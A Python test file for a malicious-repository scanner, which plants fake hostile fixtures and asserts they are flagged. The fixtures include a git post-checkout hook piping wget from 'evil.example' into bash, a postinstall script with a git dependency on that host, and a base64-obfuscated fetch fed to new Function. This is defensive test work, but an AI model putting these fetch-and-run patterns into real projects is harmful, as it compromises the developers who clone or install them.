"""python3 test_scan.py  (offline; builds a fake hostile repo like the recruiter case)"""
import base64
import json
import tempfile
from pathlib import Path

from scan import scan

with tempfile.TemporaryDirectory() as d:
    r = Path(d)
    (r / ".git/hooks").mkdir(parents=True)
    (r / ".git/hooks/post-checkout").write_text("wget -q0- 'https://evil.example/x?os=linux' | bash\n")
    (r / ".git/hooks/pre-commit.sample").write_text("echo fine\n")
    (r / "package.json").write_text(json.dumps({"scripts": {"postinstall": "node x.js", "test": "jest"},
                                                "dependencies": {"left-pad": "git+https://evil.example/l.git"}}))
    b = base64.b64encode(b"https://staging.evil.example/api/script").decode()
    (r / "src").mkdir()
    (r / "src/data.js").write_text(f"const a=1;\nfetch(atob('{b}')).then(r=>r.text()).then(s=>new Function('require',s)(require))\n")
    findings, domains = scan(r)
    msgs = [(f["severity"], f["file"], f["message"]) for f in findings]
    assert any(s == "high" and f.endswith("post-checkout") for s, f, m in msgs), msgs
    assert not any(f.endswith(".sample") for s, f, m in msgs)
    assert any("postinstall" in m for s, f, m in msgs) and not any("jest" in m for s, f, m in msgs)
    assert any("base64 string decodes to a URL" in m for s, f, m in msgs)
    assert any("new Function" in m for s, f, m in msgs)
    assert any("URL, not the registry" in m for s, f, m in msgs)
    assert "evil.example" in " ".join(domains) or "staging.evil.example" in domains, domains

with tempfile.TemporaryDirectory() as d:
    Path(d, "app.js").write_text("console.log('hi')\n")
    assert scan(d) == ([], []), scan(d)
print("ok")
